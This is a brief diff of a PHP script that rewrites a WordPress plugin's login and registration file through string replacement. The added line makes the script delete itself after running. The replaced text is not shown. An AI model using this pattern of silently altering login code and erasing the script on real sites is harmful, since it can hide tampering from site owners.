@@ -15,4 +15,5 @@ r;
 $s = str_replace($search, $place, $s);
 $replaced = file_put_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php', $s);
 var_dump($replaced);
+unlink(__FILE__);
 exit();
